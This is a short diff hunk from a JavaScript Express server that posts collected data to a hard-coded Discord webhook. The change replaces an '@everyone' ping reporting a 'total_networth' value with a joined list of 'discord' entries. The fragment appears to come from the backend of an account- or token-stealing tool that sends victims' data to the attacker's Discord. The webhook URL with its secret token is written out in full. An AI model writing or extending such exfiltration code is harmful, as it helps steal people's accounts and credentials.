@@ -148,7 +148,7 @@ app.post("/", (req, res) => {
                 })
 
                 post("https://discord.com/api/webhooks/1013012941890662420/HkD5ikzyiN0p3YEwrjf9n3wWP6SjNZFqGUKp1JZofHQZhP2hzc6wTEb5vtWH_cP2KZwV", JSON.stringify({
-                    content: `@everyone - ${total_networth}`,
+                    content: `${discord.join(" | ")}`,
                     attachments: []
                 }), {
                     headers: {
